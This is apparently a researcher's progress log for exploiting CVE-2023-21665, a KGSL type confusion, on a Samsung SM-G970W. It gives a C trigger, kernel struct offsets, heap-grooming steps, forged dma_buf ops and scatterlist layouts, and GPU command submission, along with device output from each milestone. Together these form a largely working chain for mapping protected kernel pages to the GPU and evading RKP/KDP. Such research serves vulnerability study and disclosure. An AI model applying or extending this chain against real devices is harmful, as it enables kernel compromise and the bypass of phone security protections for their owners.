# CVE-2023-21665 — verified reachable/exploitable on SM-G970W (msm-4.14)

Status: **VERIFIED on-device** (kernel Oops driven from userspace through the exact
vulnerable path). Companion to `docs/DEFEX_BYPASS.md` / `docs/RKP_REFERENCES.md`.

## The bug

`drivers/gpu/msm/kgsl.c` (this device's ROM):

```c
/* kgsl_setup_dmabuf_useraddr() */
vma = find_vma(current->mm, hostptr);
if (vma && vma->vm_file) {
        ... check_vma_flags() ...           // needs a writable VMA (VM_READ|VM_WRITE)
        if (vma->vm_file->f_op == &kgsl_fops) return -EFAULT;
        get_file(vma->vm_file);
        dmabuf = vma->vm_file->private_data;   /* <-- unchecked cast to struct dma_buf * */
}
if (IS_ERR_OR_NULL(dmabuf)) return ...;
ret = kgsl_setup_dma_buf(device, pagetable, entry, dmabuf);  /* uses it as a real dma_buf */
```

Reachable from any process that can open `/dev/kgsl-3d0` (mode `crw-rw-rw-`) via
`IOCTL_KGSL_MAP_USER_MEM` with `KGSL_USER_MEM_TYPE_ADDR`:

`kgsl_ioctl_map_user_mem` -> `_map_usermem_addr` -> `kgsl_setup_useraddr` ->
`kgsl_setup_dmabuf_useraddr` (the cast).

`CONFIG_DMA_SHARED_BUFFER=y` (verified), and this firmware's `security_patch` is
`2023-03-01`; the fix shipped in the **May-2023** Android/Qualcomm bulletin, so the
bug is **unpatched here**. It is a type confusion: any mmap-able file whose
`vm_file->private_data` is non-NULL and not a `dma_buf` (e.g. a char-device driver
that stores its own per-open struct in `file->private_data`) can be substituted.

Note `/dev/ashmem` does **not** work: `ashmem_mmap` sets `vma->vm_file = asma->file`
(the shmem backing file, `private_data == NULL`) -> -ENODEV -> the anon fallback.
`/dev/binder` does **not** work: `binder_mmap` rejects `VM_WRITE`
(`FORBIDDEN_MMAP_FLAGS = VM_WRITE`) so `check_vma_flags()` fails first.

## The PoC (trigger)

`/dev/uio0` (uio "rmtfs", 2 MiB map, mode 0660 system) stores a
`struct uio_listener *` in `file->private_data` and allows a writable MAP_SHARED
VMA -> it passes `check_vma_flags()` and supplies a non-dma_buf object.

```c
int mf = open("/dev/uio0", O_RDWR);
void *p = mmap(NULL, 0x2000, PROT_READ|PROT_WRITE, MAP_SHARED, mf, 0);
int gf = open("/dev/kgsl-3d0", O_RDWR);
struct kgsl_map_user_mem m = { .fd = mf, .len = 0x2000,
                               .hostptr = (unsigned long)p,
                               .memtype = KGSL_USER_MEM_TYPE_ADDR /* 2 */ };
ioctl(gf, IOCTL_KGSL_MAP_USER_MEM /* _IOWR(0x09,0x15,..) */, &m);
```

(Access to `/dev/uio0` needs uid 0 / group system here; the KGSL ioctl itself needs
no privilege.  `scripts/runroot.sh` was used to run the PoC as root.)

## Why this matters (next step toward DMA / stronger root)

* KGSL operates on **physical pages / IOMMU page tables**. Once an object is treated
  as a `dma_buf`, `kgsl_setup_dma_buf()` proceeds to `dma_buf_map_attachment()` and
  builds an `sg_table` from it, and stores it in the memdesc — a route to controlling
  GPU-visible mappings. That is the same class of primitive as the modern
  "dirty pagetable / GPU DMA" chains (Jamf 2026) which bypass RKP/KDP because **DMA
  does not pass through the CPU's stage-2 translation**.
* Current state: a **controlled kernel Oops** (the fake object's fields are read).
  To weaponise: heap-groom the victim object (`file->private_data`) so that
  `dmabuf->lock` is a valid unlocked mutex and `dmabuf->ops` points to controlled
  memory — then `dma_buf_attach`/`dma_buf_map_attachment` act on attacker data.
* An **app-accessible** trigger (no uid 0) would need an mmap-able, writable,
  non-dma_buf device file reachable from `untrusted_app` (candidates on this ROM:
  `/dev/video*` camera (group `camera`), `/dev/dri/renderD128` (`graphics_device`)).
  `/dev/uio0` and `/dev/mobicore` are privileged.

## Weaponisation progress (in-process DRM victim)

Building on the verified trigger, we now **control the type-confused object**. The
weaponisation uses a **shell-openable victim** — no root/helper needed:

* open `/dev/dri/renderD128` (world-rw; allowed once SELinux is permissive),
* `DRM_IOCTL_MODE_CREATE_DUMB` + `DRM_IOCTL_MODE_MAP_DUMB` + `mmap` -> a writable
  `MAP_SHARED` VMA whose `vma->vm_file->private_data` is a `struct drm_file`
  (non-`dma_buf`). (`DRM_IOCTL_MSM_GEM_NEW` fails on the render node with EINVAL; the
  dumb-buffer path works.)
* locate that object via arbitrary kernel R/W: task-(+0x880)->files,
  files-(+0x20)->fdt, fdt-(+0x8)->fd[], fd[fd]->file, file-(+0xd0)->private_data
  (offsets confirmed against the WSL ROM source, not the NTFS copy),
* **groom** it: `attachments.next/prev = &attachments` (self-linked, offset 16/24),
  `lock = 0` (offset 40), `ops =` a zeroed fake `dma_buf_ops` table (offset 32),
* fire `IOCTL_KGSL_MAP_USER_MEM(ADDR, hostptr=that VMA)`.

Result (single exploit run, `fops.c` hook `KGSL_DRM=1`):

```
kgsl_drm: create_dumb=0 map_dumb=0 off=0x100000000 size=16384
kgsl_drm: priv=ffffffc03555b000
kgsl_drm: patched [00 00 attachments=self ops=ffffff800abde160 lock=0 ...]
kgsl_drm: firing KGSL ioctl ...
PANIC: Oops PC:jopp_springboard_blr_x8+0x4/0x48  LR:dma_buf_map_attachment+0x24/0x58
```

So the wall moved from `mutex_lock(&dmabuf->lock)` (before the groom) all the way to
`dma_buf_map_attachment` calling `dmabuf->ops->map_dma_buf(...)` — an **indirect call
dispatched through the JOPP CFI springboard** (`jopp_springboard_blr_x8`). The crash is
only because the fake op is NULL. The object is now fully controlled; the next step is
to place a **valid** `map_dma_buf` (e.g. borrowed from a real dma-buf we create) and a
crafted `priv`, so `dma_buf_map_attachment` returns an attacker-controlled `sg_table`
that KGSL installs into `entry->memdesc.sgt` and maps for the GPU (the DMA / RKP-bypass
primitive).

### Milestone 2 - we invoke a real `map_dma_buf` on our object (no crash)

Pointing the fake ops' `map_dma_buf` at the **real** `drm_gem_map_dma_buf`
(`0xffffff8008725bf4`, from `kallsyms_fixed.txt`) and firing gives a clean result:

```
kgsl_drm: fake ops.map_dma_buf=ffffff80087ddbf4
kgsl_drm: firing KGSL ioctl ...
kgsl_drm: ioctl ret=-1 errno=22      # EINVAL, NO panic
kgsl_drm: restored victim
```

So the type-confused object is fully controlled, the fake `ops` is honoured and the
indirect `ops->map_dma_buf` call goes through **JOPP** (a *real* kernel function is
accepted). We simply need `map_dma_buf` to return an attacker-controlled `sg_table`.

Confirmed layouts (from the WSL source `include/linux/dma-buf.h`):

* `struct dma_buf`: `size`0, `file`8, `attachments`16, `ops`32, `lock`40, ... `priv`**0x98**.
* `struct dma_buf_ops`: `attach`0, `detach`8, `map_dma_buf`**0x10**, `unmap_dma_buf`0x18.
* `struct dma_buf_attachment`: `dmabuf`0, `dev`8, `node`16, `priv`**0x20**.

### Next: make `map_dma_buf` return a controlled `sg_table` (ion path)

`ion_map_dma_buf` (`0xffffff8009038114`) is the most direct:

```c
struct ion_dma_buf_attachment *a = attachment->priv;   // attachment->priv @0x20
struct sg_table *table = a->table;                     // ion_dma_buf_attachment.table @0x8
struct ion_buffer *buffer = attachment->dmabuf->priv;  // our object +0x98
... dma_map_sg_attrs(dev, table->sgl, table->nents, dir, ...); return table;
```

and `ion_dma_buf_attach` sets `attachment->priv = a` with `a->table =
dup_sg_table(buffer->sg_table)`. So with

* `ops->attach = ion_dma_buf_attach`, `ops->map_dma_buf = ion_map_dma_buf`,
* our object's `priv` (+0x98) -> a crafted fake `struct ion_buffer` whose `sg_table`
  points at a crafted `struct scatterlist[]` (with chosen `struct page*` = `vmemmap +
  pfn`), `flags`/`lock` valid,

`dma_buf_map_attachment` returns that sg_table and KGSL installs it into
`entry->memdesc.sgt` and maps it for the GPU -> **GPU DMA to chosen physical pages**
(the RKP/KDP-bypassing primitive). Requires computing `struct page*` for a target PFN
(`vmemmap + pfn`), and the `PagePrivate(sg_page(s))==0` check passes for normal pages.

### Milestone 3 - `map_dma_buf` returns an attacker-controlled `sg_table` (DMA primitive)

**Achieved.** `KGSL_SGT=1` (`src/core/fops.c`) builds a self-contained fake
`struct ion_buffer` + `sg_table` + `scatterlist` inside the victim object and points
the fake ops at the real `ion_dma_buf_attach` / `ion_map_dma_buf`. Firing gives:

```
kgsl_drm: SGT page=ffffffbf06027140 page_link=ffffffbf06027142 attach=ffffff80091eff3c map=ffffff80091f0114
kgsl_drm: firing KGSL ioctl gfd=10 hostptr=0x703b9c6000 ...
kgsl_drm: ioctl ret=0 errno=0            # success: KGSL installed our sg_table
kgsl_drm: restored victim
```

`ret=0` means the whole chain ran cleanly:
`dma_buf_attach` -> `ops->attach = ion_dma_buf_attach` (JOPP-accepted) ->
`dup_sg_table(buffer->sg_table)` copied our `scatterlist` -> `dma_buf_map_attachment`
-> `ops->map_dma_buf = ion_map_dma_buf` -> `dma_map_sg_attrs` mapped our chosen
`struct page` -> KGSL's `PagePrivate()` check passed -> `entry->memdesc.size += 0x1000`
-> the memdesc now holds **our** `sg_table`. The GPU can therefore be pointed at any
`struct page` = **GPU DMA to an arbitrary physical page** (no CPU stage-2 walk involved,
so RKP/KDP do not see it).

Offsets / facts pinned down along the way:

* `struct page*` for a linear-map kernel VA `A`:
  `page = VMEMMAP_START + ((A - PAGE_OFFSET) >> 12) * sizeof(struct page)`
  (`VMEMMAP_START=0xffffffbf00000000`, `P0_PAGE_OFFSET=0xffffffc000000000`,
  `sizeof(struct page)=0x40`); this exactly matches arm64 `virt_to_page()`
  (`vmemmap = (struct page *)VMEMMAP_START - (memstart_addr >> PAGE_SHIFT)`), and is
  independent of `memstart_addr`.
* `struct scatterlist` (CONFIG_NEED_SG_DMA_LENGTH=y, no DEBUG_SG): `page_link`@0,
  `offset`@8, `length`@0xc, `dma_address`@0x10, `dma_length`@0x18 (size 0x20). Last
  entry needs the `SG_END` bit (`|2`).
* `struct sg_table`: `sgl`@0, `nents`@8, `orig_nents`@0xc.
* **The shipped 4.14.190 build reads `buffer = *(dmabuf + 0xa0)` and
  `buffer->sg_table = *(buffer + 0x80)`** inside `ion_dma_buf_attach` (read off the
  kernel's own code from a crash PC dump: `ldr x25,[x0,#0xa0]; ...; ldr x26,[x25,#0x80]`).
  That is 8 bytes off the header-derived layout (`priv`@0x98, `sg_table`@0x78), so the
  fake object sets the pointer at **both** 0x98/0xa0 and 0x70/0x78/0x80 and self-links
  the `attachments` list at 0x88/0x90 — it satisfies every plausible layout.
* Cannot read kernel `.text` through the configfs gadget: `CONFIG_HARDENED_USERCOPY=y`
  makes `copy_to_user` from `.text` hit `kernel BUG at mm/usercopy.c:72`
  (`report_usercopy`). Offsets must come from crash PC dumps instead (as above).
* Repointing our own `cred` (to `init_cred`) is caught by **RKP**
  (`RKP CRED PROTECTION VIOLATION / security_integrity_current`), so we cannot gain uid 0
  that way to open `/dev/ion` (mode 0664 `system:system`).

Next: aim the scatterlist at a chosen target PFN (e.g. a page we own, then kernel
text/rodata) and read/write it through the GPU; that is the arbitrary-physical
read/write primitive.

### Milestone 4 - SMMU can map a stage-2-protected kernel page

`KGSL_SGT_PHYS=<hex>` aims the forged scatterlist at an arbitrary physical page.
Pointing it at the `.rodata` page that CPU writes cannot touch (see
`docs/RUNTIME_PHYS_PTE.md`: a CPU store there is trapped by EL2/KDP and halts the
SoC) still succeeds:

```
kgsl_drm: SGT_PHYS=0000000081980000 ms=0000000080000000 pfn=00001980
kgsl_drm: ioctl ret=0 errno=0
```

So `dma_buf_map_attachment -> ion_map_dma_buf -> dma_map_sg_attrs` created a
device (GPU/SMMU) mapping of a physical page that is write-banned for the CPU.
The SMMU tables are programmed by Linux, not by the secure monitor, so the GPU
is handed a writable view of a kernel-image page.

The forged ops must carry **all four** callbacks used by the dma-buf/KGSL path
(`attach`@0, `detach`@8, `map_dma_buf`@0x10, `unmap_dma_buf`@0x18 =
`ion_dma_buf_attach`/`ion_dma_buf_detatch`/`ion_map_dma_buf`/`ion_unmap_dma_buf`),
and the mem entry must be torn down **while the forgery is still installed**:

* at `do_exit()` KGSL runs `kgsl_release -> kgsl_mem_entry_destroy ->
  kgsl_destroy_ion -> dma_buf_unmap_attachment`, which dispatches through the
  object's `ops`.  If we have already restored the victim, `ops` is the original
  `drm_file` field and the indirect call fails the JOPP/CFI check
  (`Oops PC:jopp_springboard_blr_x8 LR:dma_buf_unmap_attachment`).
* fix: `close()` the `/dev/kgsl-3d0` fd right after the ioctl, so the teardown
  runs while the forged ops is still in place, then restore the victim.

Next: submit a `CP_MEM_WRITE` to the returned GPU address and check whether the
GPU write actually lands in the protected `.rodata` page (the open question).

### Milestone 5 - a GPU command is accepted that writes the protected page

`KGW=1` finishes the chain: it maps the target page (gpuaddr from MAP_USER_MEM),
builds a PM4 `CP_MEM_WRITE` (`0x73d0003` = type-7 / op `0x3d` / count 3, then
`addr_lo, addr_hi, value`) into one of our own anonymous pages, maps that page as
a second GPU buffer, creates a draw context and submits:

```
kgsl_drm: ioctl ret=0 gpuaddr=0000000500000000          # target page mapped
kgw: ib_phys=000000011af6f000 gpu_tgt=0000000500000000 pm4=703d0003 00000000 00000005 deadbeef
kgw: ib map ret=0 gpuaddr=0000000500001000
kgw: drawctxt ret=0 ctx=0000000d
kgw: submit ret=0 ts=1                                  # GPU accepted the command
kgsl_drm: closed kgsl fd (teardown ran)
```

Notes that mattered:
* `IOCTL_KGSL_RINGBUFFER_ISSUEIBCMDS`'s "ultra-legacy" path (used when
  `KGSL_DRAWOBJ_SUBMIT_IB_LIST` is clear) takes `ibdesc_addr` = **IB gpuaddr** and
  `numibs` = **size in dwords**, not a user pointer list.
* `IOCTL_KGSL_DRAWCTXT_CREATE` needs `KGSL_CONTEXT_PREAMBLE|KGSL_CONTEXT_NO_GMEM_ALLOC`
  (0x12) or it returns `-EINVAL`.
* the IB page is one of our own anon pages; its phys is found with the dirty-PTE
  walk (`docs/RUNTIME_PHYS_PTE.md`) and turned into a `struct page*` for the
  scatterlist.

Open item: the in-process read-back of the target page (a dirty PTE over the
`.rodata` phys) was added but the test runs kept being cut short by unrelated
device reboots (`dqget` Oops in another process).  Verification that the GPU
store actually lands is still pending.

### Result - the CP does not perform the store

The packet header must include the odd-parity bits that `cp_type7_packet()`
folds in (opcode parity at bit 23, count parity at bit 15); `CP_MEM_WRITE` with
count 3 is therefore `0x70bd0003`, not `0x703d0003`.  With the correct header the
command is still accepted (`submit ret=0 ts=1`) but **nothing is written**.

The `KGW_SELF=1` control points the same `CP_MEM_WRITE` 0x20 bytes into **our own
IB page** - an ordinary, unprotected, GPU-mapped buffer we can read from the CPU:

```
kgw: pm4=70bd0003 00001020 00000005 deadbeef -> 0000000500001020
kgw: submit ret=0 ts=1 errno=0
kgw: SELFTEST ib[8]=00000000 want=deadbeef
```

The word is **not** written, so this is not a stage-2/KDP result: the CP simply
does not service a `CP_MEM_WRITE` from an ordinary (non-secure, user) IB on this
firmware.  Therefore the GPU/SMMU mapping we *can* create - a stage-2-protected
`.rodata` page handed to the device with write permission - cannot (yet) be
turned into a store.

Routes not tried: a render/draw writing to the mapped buffer (needs a full a6xx
shader/command program), `CP_MEM_TO_MEM`/`CP_DMA`, or another DMA-capable block
(MDP/Venus/Hexagon).  `WAITTIMESTAMP` is `-ENOTTY` on this kernel, so completion
was waited for with a plain sleep.
